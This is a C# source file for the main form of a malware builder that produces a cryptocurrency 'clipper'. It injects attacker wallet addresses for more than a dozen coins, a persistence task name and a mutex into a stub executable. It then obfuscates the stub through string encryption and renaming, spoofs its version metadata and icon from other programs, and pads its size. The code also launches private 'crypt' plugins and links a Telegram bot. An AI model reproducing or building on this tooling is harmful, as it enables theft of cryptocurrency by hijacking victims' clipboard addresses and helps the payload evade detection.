using dnlib.DotNet;
using MetroFramework.Forms;
using System;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using dnlib.DotNet.Emit;
using System.Diagnostics;
using Toolbelt.Drawing;
using Vestris.ResourceLib;
using Builder.Forms_Add_Wallets;
using Builder.RenamingObfuscation;
using Builder.Plugins;
using Stub.Help;
using MetroFramework.Controls;

namespace Builder
{
    public partial class Form1 : MetroForm
    {

        public Form1(string fileName)
        {
            InitializeComponent();
        }

        

        // Сборка
        private async void metroButton20_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default.DIR = metroTextBox2.Text;
            Properties.Settings.Default.EXE = metroTextBox3.Text;
            Properties.Settings.Default.TASKNAME = metroTextBox4.Text;
            Properties.Settings.Default.MUTEX = metroTextBox5.Text;
            Properties.Settings.Default.Save();

            ModuleDefMD asmDef = null;
            try
            {
                string stubexe = Path.Combine(Application.StartupPath, "stub", "Stub.exe");
                if (!File.Exists(stubexe))
                {
                    MessageBox.Show("File Stub.exe Not Found \n\t" + stubexe, "File Not Found", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                using (asmDef = ModuleDefMD.Load(stubexe))
                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                {
                    saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                    saveFileDialog1.InitialDirectory = Application.StartupPath;
                    saveFileDialog1.OverwritePrompt = true;
                    saveFileDialog1.FileName = "ClipperBuild";
                    if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                    {
                        WriteSettings(asmDef, saveFileDialog1.FileName);
                        WriteSettingsPeresentation(asmDef, saveFileDialog1.FileName);
                        EncryptString.DoEncrypt(asmDef);
                        await Task.Run(() =>
                        {
                            Renaming.DoRenaming(asmDef);
                        });

                        asmDef.Write(saveFileDialog1.FileName);
                        asmDef.Dispose();

                        if (metroCheckBox2.Checked)
                        {
                            WriteAssembly(saveFileDialog1.FileName);
                        }
                        if (metroCheckBox1.Checked && !string.IsNullOrEmpty(metroTextBox16.Text))
                        {
                            IconInjector.InjectIcon(saveFileDialog1.FileName, metroTextBox16.Text);
                        }
                        if (metroCheckBox3.Checked)
                        {
                            AddBytes.Add(saveFileDialog1.FileName, Convert.ToInt32(metroTextBox14.Text) * 1024);
                        }


                        Form1 formBuilt = new Form1(saveFileDialog1.FileName);
                        MessageBox.Show("OK: " + saveFileDialog1.FileName, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                asmDef?.Dispose();
            }
        }

        // Записываем инфо о файле
        private void WriteAssembly(string filename)
        {
            try
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(filename);

                versionResource.FileVersion = metroTextBox13.Text;
                versionResource.ProductVersion = metroTextBox6.Text;
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["ProductName"] = metroTextBox6.Text;
                stringFileInfo["FileDescription"] = metroTextBox7.Text;
                stringFileInfo["CompanyName"] = metroTextBox8.Text;
                stringFileInfo["LegalCopyright"] = metroTextBox9.Text;
                stringFileInfo["LegalTrademarks"] = metroTextBox10.Text;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = metroTextBox11.Text;
                stringFileInfo["OriginalFilename"] = metroTextBox11.Text;
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;

                versionResource.SaveTo(filename);
            }
            catch (Exception ex)
            {
                throw new ArgumentException("Assembly: " + ex.Message);
            }
        }

        // Записываем настройки в STUB
        private void WriteSettings(ModuleDefMD asmDef, string AsmName)
        {
            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (type.Name == "Config")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    // Install
                                    if (method.Body.Instructions[i].Operand.ToString() == "%DIR%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.DIR;

                                    if (method.Body.Instructions[i].Operand.ToString() == "%EXE%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.EXE;

                                    if (method.Body.Instructions[i].Operand.ToString() == "%TASKNAME%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.TASKNAME;

                                    if (method.Body.Instructions[i].Operand.ToString() == "%MUTEX%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.MUTEX;

                                    if (method.Body.Instructions[i].Operand.ToString() == "%BTC%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.BTC;

                                    if (method.Body.Instructions[i].Operand.ToString() == "%BCH%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.BCH;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%DOGE%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.DOGE;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%ETH%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.ETH;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%LTC%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.LTC;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%XMR%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.XMR;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%xlm%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.xlm;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%xrp%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.xrp;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%nec%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.nec;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%dash%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.dash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%trx%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.trx;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%zcash%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.zcash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%bnb%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.bnb;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%BTC_BC1%")
                                        method.Body.Instructions[i].Operand = Properties.Settings.Default.BTC_bc1;

                                    if (metroCheckBox4.Checked)
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "%ADDDBYTES%")
                                            method.Body.Instructions[i].Operand = "true";
                                        if (method.Body.Instructions[i].Operand.ToString() == "%ADDDBKB%")
                                            method.Body.Instructions[i].Operand = metroTextBox15.Text;
                                    }
                                    else
                                    {
                                        if (method.Body.Instructions[i].Operand.ToString() == "%ADDDBYTES%")
                                            method.Body.Instructions[i].Operand = "false";
                                        if (method.Body.Instructions[i].Operand.ToString() == "%ADDDBKB%")
                                            method.Body.Instructions[i].Operand = "0";
                                    }
                                }
                            }
                        }
                }
            }
            catch (Exception ex)
            {
                throw new ArgumentException("WriteSettings Error: " + ex.Message);
            }

        }

        private void WriteSettingsPeresentation(ModuleDefMD asmDef, string AsmName)
        {
            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = Path.GetFileName(AsmName);
                    if (type.Name == "Cfgnative")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "%BTC%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.BTC;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%BCH%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.BCH;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%DOGE%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.DOGE;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%ETH%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.ETH;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%LTC%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.LTC;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%XMR%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.XMR;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%xlm%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.xlm;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%xrp%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.xrp;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%nec%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.nec;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%dash%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.dash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%trx%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.trx;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%zcash%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.zcash;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%bnb%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.bnb;
                                    if (method.Body.Instructions[i].Operand.ToString() == "%BTC_BC1%")
                                        method.Body.Instructions[i].Operand = Properties.PresentationWallets.Default.BTC_bc1;
                                }
                            }
                        }
                }
            }
            catch
            {
            }
        }

        private void metroCheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox2.Checked)
            {
                metroButton9.Enabled = true;
                metroTextBox6.Enabled = true;
                metroTextBox7.Enabled = true;
                metroTextBox8.Enabled = true;
                metroTextBox9.Enabled = true;
                metroTextBox10.Enabled = true;
                metroTextBox11.Enabled = true;
                metroTextBox11.Enabled = true;
                metroTextBox12.Enabled = true;
                metroTextBox13.Enabled = true;
            }
            else
            {
                metroButton9.Enabled = false;
                metroTextBox6.Enabled = false;
                metroTextBox7.Enabled = false;
                metroTextBox8.Enabled = false;
                metroTextBox9.Enabled = false;
                metroTextBox10.Enabled = false;
                metroTextBox11.Enabled = false;
                metroTextBox11.Enabled = false;
                metroTextBox12.Enabled = false;
                metroTextBox13.Enabled = false;
            }
        }

        private void metroButton17_Click(object sender, EventArgs e)
        {
            metroTextBox5.Text = Methods.GetRandomString(32);
        }

        private void metroButton9_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var fileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);

                    metroTextBox11.Text = fileVersionInfo.InternalName ?? string.Empty;
                    metroTextBox7.Text = fileVersionInfo.FileDescription ?? string.Empty;
                    metroTextBox8.Text = fileVersionInfo.CompanyName ?? string.Empty;
                    metroTextBox12.Text = fileVersionInfo.ProductName ?? string.Empty;
                    metroTextBox9.Text = fileVersionInfo.LegalCopyright ?? string.Empty;
                    metroTextBox10.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;

                    var version = fileVersionInfo.FileMajorPart;
                    metroTextBox13.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                    metroTextBox6.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                }
            }
        }

        private void metroCheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (metroCheckBox1.Checked)
            {
                metroTextBox16.Enabled = true;
                metroButton16.Enabled = true;
            }
            else
            {
                metroTextBox16.Enabled = false;
                metroButton16.Enabled = false;
            }
        }

        private void metroButton16_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Choose Icon";
                ofd.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    if (ofd.FileName.ToLower().EndsWith(".exe"))
                    {
                        string ico = GetIcon(ofd.FileName);
                        metroTextBox16.Text = ico;
                        picIcon.ImageLocation = ico;
                    }
                    else
                    {
                        metroTextBox16.Text = ofd.FileName;
                        picIcon.ImageLocation = ofd.FileName;
                    }
                }
            }
        }

        private string GetIcon(string path)
        {
            try
            {
                string tempFile = Path.GetTempFileName() + ".ico";
                using (FileStream fs = new FileStream(tempFile, FileMode.Create))
                {
                    IconExtractor.Extract1stIconTo(path, fs);
                }
                return tempFile;
            }
            catch { }
            return "";
        }

        private void metroButton1_Click(object sender, EventArgs e)
        {
            Add_Wallets formBuilt = new Add_Wallets(Properties.Settings.Default.BTC, Properties.Settings.Default.BTC_num, "Bitcoin/BTC/p2pkh/p2wpkh-p2sh Adress (1...|3...)");
            formBuilt.ShowDialog();
            metroLabel18.Text = Properties.Settings.Default.BTC_num;
        }

        private void metroButton18_Click(object sender, EventArgs e)
        {
            Add_Wallets formBuilt = new Add_Wallets(Properties.Settings.Default.BTC_bc1, Properties.Settings.Default.BTC_bc1_num, "Bitcoin/BTC/p2wpkh Adress (bc1...)");
            formBuilt.ShowDialog();
            metroLabel5.Text = Properties.Settings.Default.BTC_bc1_num;
        }

        private void metroButton4_Click(object sender, EventArgs e)
        {
            Add_Wallets formBuilt = new Add_Wallets(Properties.Settings.Default.trx, Properties.Settings.Default.trx_num, "TRON/TRX/TRC20 Adress (T...)");
            formBuilt.ShowDialog();
            metroLabel20.Text = Properties.Settings.Default.trx_num;
        }

        private void metroButton2_Click(object sender, EventArgs e)
        {
            Add_Wallets formBuilt = new Add_Wallets(Properties.Settings.Default.ETH, Properties.Settings.Default.ETH_num, "Ethereum/ETH/ERC20 Adress (0x...)");
            formBuilt.ShowDialog();
            metroLabel19.Text = Properties.Settings.Default.ETH_num;
        }

        private void metroButton3_Click(object sender, EventArgs e)
        {
            Add_Wallets formBuilt = new Add_Wallets(Properties.Settings.Default.BCH, Properties.Settings.Default.BCH_num, "BitcoinCash/BCH Adress (q...|p...)");
            formBuilt.ShowDialog();
            metroLabel21.Text = Properties.Settings.Default.BCH_num;
        }

        private void metroButton8_Click(object sender, EventArgs e)
        {
            Add_Wallets formBuilt = new Add_Wallets(Properties.Settings.Default.DOGE, Properties.Settings.Default.DOGE_num, "DOGE Adress (D...)");
            formBuilt.ShowDialog();
            metroLabel22.Text = Properties.Settings.Default.DOGE_num;
        }

        private void metroButton7_Click(object sender, EventArgs e)
        {
            Add_Wallets formBuilt = new Add_Wallets(Properties.Settings.Default.LTC, Properties.Settings.Default.LTC_num, "LiteCoin/LTC Adress (L...|M...)");
            formBuilt.ShowDialog();
            metroLabel23.Text = Properties.Settings.Default.LTC_num;
        }

        private void metroButton6_Click(object sender, EventArgs e)
        {
            Add_Wallets formBuilt = new Add_Wallets(Properties.Settings.Default.XMR, Properties.Settings.Default.XMR_num, "Monero/XMR Adress (4...|8...)");
            formBuilt.ShowDialog();
            metroLabel24.Text = Properties.Settings.Default.XMR_num;
        }

        private void metroButton5_Click(object sender, EventArgs e)
        {
            Add_Wallets formBuilt = new Add_Wallets(Properties.Settings.Default.xlm, Properties.Settings.Default.xlm_num, "Stellar/XLM Adress (G...)");
            formBuilt.ShowDialog();
            metroLabel25.Text = Properties.Settings.Default.xlm_num;
        }

        private void metroButton14_Click(object sender, EventArgs e)
        {
            Add_Wallets formBuilt = new Add_Wallets(Properties.Settings.Default.xrp, Properties.Settings.Default.xrp_num, "Ripple/XRP Adress (r...)");
            formBuilt.ShowDialog();
            metroLabel26.Text = Properties.Settings.Default.xrp_num;
        }

        private void metroButton13_Click(object sender, EventArgs e)
        {
            Add_Wallets formBuilt = new Add_Wallets(Properties.Settings.Default.nec, Properties.Settings.Default.nec_num, "Neocoin/NEC Adress (A...)");
            formBuilt.ShowDialog();
            metroLabel27.Text = Properties.Settings.Default.nec_num;
        }

        private void metroButton12_Click(object sender, EventArgs e)
        {
            Add_Wallets formBuilt = new Add_Wallets(Properties.Settings.Default.dash, Properties.Settings.Default.dash_num, "Dash/DASH Adress (X...)");
            formBuilt.ShowDialog();
            metroLabel28.Text = Properties.Settings.Default.dash_num;
        }

        private void metroButton10_Click(object sender, EventArgs e)
        {
            Add_Wallets formBuilt = new Add_Wallets(Properties.Settings.Default.zcash, Properties.Settings.Default.zcash_num, "ZCash/ZEC Adress (t1...)");
            formBuilt.ShowDialog();
            metroLabel29.Text = Properties.Settings.Default.zcash_num;
        }

        private void metroButton15_Click(object sender, EventArgs e)
        {
            Add_Wallets formBuilt = new Add_Wallets(Properties.Settings.Default.bnb, Properties.Settings.Default.bnb_num, "BinanceCoin/BNB Adress (bnb...)");
            formBuilt.ShowDialog();
            metroLabel30.Text = Properties.Settings.Default.bnb_num;

        }

        private void metroLink2_Click(object sender, EventArgs e)
        {
            Process.Start("https://t.me/devxstudiobot");
        }

        private void metroButton19_Click(object sender, EventArgs e)
        {
            if (File.Exists("crypt.exe"))
            {
                MessageBox.Show("Plugin Activated!", "Private Plugin", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Process.Start("crypt.exe");
            }
            else
            {
                FormPrivate_Plugins formBuilt = new FormPrivate_Plugins();
                formBuilt.ShowDialog();
            }
        }

        private void metroButton21_Click(object sender, EventArgs e)
        {
            if (File.Exists("crypt.exe"))
            {
                MessageBox.Show("Plugin Activated!", "Private Plugin", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Process.Start("fileclp.exe");
            }
            else
            {
                FormPrivate_Plugins formBuilt = new FormPrivate_Plugins();
                formBuilt.ShowDialog();
            }
        }

        private void metroButton22_Click(object sender, EventArgs e)
        {
            if (File.Exists("crypt.exe"))
            {
                MessageBox.Show("Plugin Activated!", "Private Plugin", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Process.Start("sp.exe");
            }
            else
            {
                FormPrivate_Plugins formBuilt = new FormPrivate_Plugins();
                formBuilt.ShowDialog();
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
           
        }
    }
}
